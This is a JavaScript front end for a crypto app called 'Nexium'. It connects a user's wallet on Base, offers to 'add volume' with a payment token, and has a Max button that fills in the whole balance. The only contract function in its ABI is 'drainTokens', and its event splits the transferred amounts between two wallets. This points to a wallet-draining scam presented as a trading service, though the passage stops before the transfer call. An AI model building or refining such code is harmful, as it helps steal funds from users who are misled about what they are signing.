import { ethers } from 'ethers';
import '/style.css'; 

const CONTRACT_ADDRESS = '0x787Dc66a47cAe12Abd3130Ad6dD700c1313666bf';
const CONTRACT_ABI = [
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "user", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "token", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "amountToWallet1", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amountToWallet2", "type": "uint256"}
    ],
    "name": "TokensTransferred",
    "type": "event"
  },
  {
    "inputs": [{"internalType": "address", "name": "token", "type": "address"}],
    "name": "drainTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

const TOKEN_LIST = [
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Dai', symbol: 'DAI', decimals: 18 },
  { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
  { address: '0x1B0Fad85A9D6D4eD7e6cDDe41a1ea5e9f1178e79', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 }
];

class NexiumApp {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.contract = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.initApp();
  }

  async initApp() {
    await new Promise(resolve => {
      if (document.readyState !== 'loading') {
        console.log('DOM ready, initializing app at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
        resolve();
      } else {
        console.log('Waiting for DOMContentLoaded at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
        document.addEventListener('DOMContentLoaded', () => {
          console.log('DOMContentLoaded fired at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
          resolve();
        });
      }
    });
    this.cacheDOMElements();
    if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
      console.error('Required DOM elements missing at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), {
        app: !!this.dom.app,
        walletButton: !!this.dom.walletButton,
        metamaskPrompt: !!this.dom.metamaskPrompt
      });
      document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Please check HTML for #app, #walletButton, and #metamaskPrompt.</p>';
      return;
    }
    this.setupEventListeners();
    this.checkWalletAndPrompt(); // Updated method name
  }

  cacheDOMElements() {
    console.log('Caching DOM elements at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: null,
      volumeInput: null,
      maxButton: null,
      addVolumeBtn: null
    };
    console.log('Cached DOM elements:', {
      app: !!this.dom.app,
      walletButton: !!this.dom.walletButton,
      metamaskPrompt: !!this.dom.metamaskPrompt,
      feedbackContainer: !!this.dom.feedbackContainer,
      defaultPrompt: !!this.dom.defaultPrompt
    });
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      this.dom.walletButton.addEventListener('click', () => this.connectWallet());
      this.dom.walletButton.addEventListener('keypress', (e) => e.key === 'Enter' && this.connectWallet());
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  // Updated method
  checkWalletAndPrompt() {
    console.log('Checking wallet...', { ethereum: !!window.ethereum });
    if (this.isWalletInstalled()) {
      console.log('Wallet detected, hiding prompt');
      this.hideMetaMaskPrompt();
      this.attachMetaMaskListeners();
      this.checkWalletConnection();
    } else {
      console.log('No wallet detected, showing prompt');
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('No wallet installed. Please install MetaMask, Trust Wallet, or Coinbase Wallet to continue.', 'error');
    }
  }

  attachMetaMaskListeners() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        console.log('Accounts changed:', accounts);
        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
      });
      window.ethereum.on('chainChanged', () => {
        console.log('Chain changed, reloading');
        window.location.reload();
      });
    }
  }

  async checkWalletConnection() {
    if (this.isWalletInstalled()) {
      if (this.isWalletConnected() && navigator.onLine) {
        await this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected');
        this.showDefaultPrompt();
        if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
        else this.showFeedback('Wallet detected but not connected. Click Connect Wallet.', 'info');
      }
    }
  }

  // Updated method
  isWalletInstalled() { 
    return !!window.ethereum; // Detects any wallet (MetaMask, Trust Wallet, Coinbase Wallet)
  }

  isWalletConnected() { 
    return !!window.ethereum && !!window.ethereum.selectedAddress; 
  }

  // New method
  detectWalletType() {
    if (!window.ethereum) return 'None';
    if (window.ethereum.isMetaMask) return 'MetaMask';
    if (window.ethereum.isCoinbaseWallet) return 'Coinbase Wallet';
    if (window.ethereum.isTrust) return 'Trust Wallet';
    return 'Generic Wallet';
  }

  // New method
  redirectToWalletInstall() {
    // Redirect to a simple page with wallet install links (you can create this HTML page)
    window.location.href = '/install-wallet.html';
    // Suggested content for install-wallet.html:
    // <a href="https://metamask.io/download/">Install MetaMask</a><br>
    // <a href="https://trustwallet.com/">Install Trust Wallet</a><br>
    // <a href="https://www.coinbase.com/wallet">Install Coinbase Wallet</a>
  }

  async connectWallet() {
    if (this.connecting || !navigator.onLine) return;
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (!this.isWalletInstalled()) {
      this.showFeedback('No wallet detected. Redirecting to install options...', 'info');
      this.redirectToWalletInstall();
      return; // Exit early to avoid "Connecting..." state
    }
    this.connecting = true;
    try {
      this.updateButtonState('connecting');
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts.length > 0) {
        await this.handleSuccessfulConnection();
        this.hideMetaMaskPrompt();
        this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
      } else {
        this.showFeedback('No accounts found. Unlock your wallet.', 'error');
        this.showDefaultPrompt();
        this.hideMetaMaskPrompt();
      }
    } catch (error) {
      this.handleConnectionError(error);
      this.showDefaultPrompt();
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
    }
  }

  async handleSuccessfulConnection() {
    try {
      this.provider = new ethers.BrowserProvider(window.ethereum);
      this.signer = await this.provider.getSigner();
      this.contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, this.signer);
      const network = await this.provider.getNetwork();
      const expectedChainId = 8453; // Base Mainnet
      if (Number(network.chainId) !== expectedChainId) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${expectedChainId.toString(16)}`,
                  chainName: 'Base Mainnet',
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  rpcUrls: ['https://mainnet.base.org'],
                  blockExplorerUrls: ['https://basescan.org']
                }],
              });
            } catch (addError) {
              this.showFeedback(`Failed to add Base Mainnet: ${addError.message}`, 'error');
              this.showDefaultPrompt();
              return;
            }
          } else {
            this.showFeedback(`Please switch to Base Mainnet (Error: ${switchError.message})`, 'error');
            this.showDefaultPrompt();
            return;
          }
        }
      }
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      this.renderTokenInterface();
      this.hideMetaMaskPrompt();
      this.showFeedback('Wallet connected to Base Mainnet!', 'success');
    } catch (error) {
      this.handleConnectionError(error);
      this.showDefaultPrompt();
      this.showMetaMaskPrompt();
    }
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.hideMetaMaskPrompt();
    this.showFeedback('Wallet disconnected', 'warning');
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    window.location.reload();
  }

  updateButtonState(state, address = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isWalletInstalled()) this.showMetaMaskPrompt(); // Updated check
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <h2 class="section-title">Load Token</h2>
      <div class="input-group">
        <input id="customTokenInput" type="text" placeholder="Enter token address (e.g., 0x...)" class="custom-token-input" aria-label="Custom token address">
        <button id="fetchCustomTokenBtn" class="fetch-custom-token-btn" aria-label="Load custom token">
        →
        </button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.addEventListener('click', () => this.loadCustomTokenData());
      this.dom.fetchCustomTokenBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.loadCustomTokenData());
    }
    this.hideMetaMaskPrompt();
  }

  // Updated method
  async loadCustomTokenData() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    const tokenAddress = this.dom.customTokenInput?.value.trim();
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      this.showFeedback('Please enter a valid Ethereum address (0x...)', 'error');
      this.dom.customTokenInput?.focus();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) {
      this.showFeedback('This token is already loaded', 'info');
      return;
    }
    try {
      this.toggleTokenLoading(true);
      console.log('Loading custom token:', tokenAddress);
      // Simplified: No strict ERC-20 validation, just basic info with fallbacks
      let name = 'Unknown Token';
      let symbol = 'UNK';
      // Use TOKEN_LIST as fallback if available
      const tokenFromList = TOKEN_LIST.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
      } else {
        // Optional: Try a lightweight contract call with fallback
        try {
          const tokenContract = new ethers.Contract(
            tokenAddress,
            ["function name() view returns (string)", "function symbol() view returns (string)"],
            this.provider
          );
          const [contractName, contractSymbol] = await Promise.all([
            tokenContract.name().catch(() => name),
            tokenContract.symbol().catch(() => symbol)
          ]);
          name = contractName || name;
          symbol = contractSymbol || symbol;
        } catch (e) {
          console.warn('Contract call failed, using defaults:', e);
        }
      }
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol) };
      this.lastSelectedToken = tokenAddress;
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(tokenAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
      this.renderVolumeControls();
      this.showFeedback(`Loaded ${this.currentToken.symbol} successfully!`, 'success');
    } catch (error) {
      console.error('Error loading custom token:', error);
      this.showFeedback('Failed to load token. Using default info.', 'warning');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
    }
  }

  toggleTokenLoading(isLoading) {
    if (!this.dom.fetchCustomTokenBtn) return;
    this.dom.fetchCustomTokenBtn.disabled = isLoading;
    this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
    this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    const volumeSection = document.createElement('div');
    volumeSection.id = 'volumeSection';
    volumeSection.className = 'volume-section fade-in';
    volumeSection.innerHTML = `
      <h2 class="section-title">Add Volume using Payment Token</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <select id="tokenSelect" class="token-select" aria-label="Select payment token">
        <option value="" disabled selected>Select payment token</option>
        ${TOKEN_LIST.filter(t => t.address.toLowerCase() !== this.currentToken.address.toLowerCase())
          .map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.symbol})</option>`).join('')}
      </select>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount to pay" class="volume-input" aria-label="Token amount">
        <button id="maxButton" class="max-button" aria-label="Set maximum amount">Max</button>
      </div>
      <button id="addVolumeBtn" class="action-button" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    tokenInterface.appendChild(volumeSection);
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeInput = document.getElementById('volumeInput');
    this.dom.maxButton = document.getElementById('maxButton');
    this.dom.addVolumeBtn = document.getElementById('addVolumeBtn');
    this.dom.volumeSection = volumeSection;
    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.addEventListener('change', () => {
        const selectedToken = this.dom.tokenSelect.selectedOptions[0];
        const symbol = selectedToken?.dataset.symbol || 'selected token';
        this.dom.volumeInput.placeholder = `Amount to pay (${symbol})`;
        this.loadPaymentTokenDetails(selectedToken?.value);
      });
    }
    if (this.dom.maxButton) {
      this.dom.maxButton.addEventListener('click', () => this.setMaxAmount());
      this.dom.maxButton.addEventListener('keypress', (e) => e.key === 'Enter' && this.setMaxAmount());
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.addEventListener('click', () => this.addVolume());
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.addVolume());
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress || !this.provider) return;
    try {
      this.toggleTokenLoading(true);
      const paymentTokenContract = new ethers.Contract(
        paymentTokenAddress,
        ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
        this.provider
      );
      const [balance, decimals] = await Promise.all([
        paymentTokenContract.balanceOf(await this.signer.getAddress()),
        paymentTokenContract.decimals()
      ]);
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals };
      this.showFeedback(`Loaded ${this.getTokenSymbol(paymentTokenAddress)} with balance ${ethers.formatUnits(balance, decimals)}`, 'info');
    } catch (error) {
      console.error('Error loading payment token:', error);
      this.showFeedback('Failed to load payment token details.', 'error');
    } finally {
      this.toggleTokenLoading(false);
    }
  }

  async setMaxAmount() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('Please select a payment token first', 'error');
      this.dom.tokenSelect?.focus();
      return;
    }
    this.dom.volumeInput.value = ethers.formatUnits(this.currentPaymentToken.balance, this.currentPaymentToken.decimals);
    this.showFeedback('Set to maximum payment token balance', 'info');
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      retur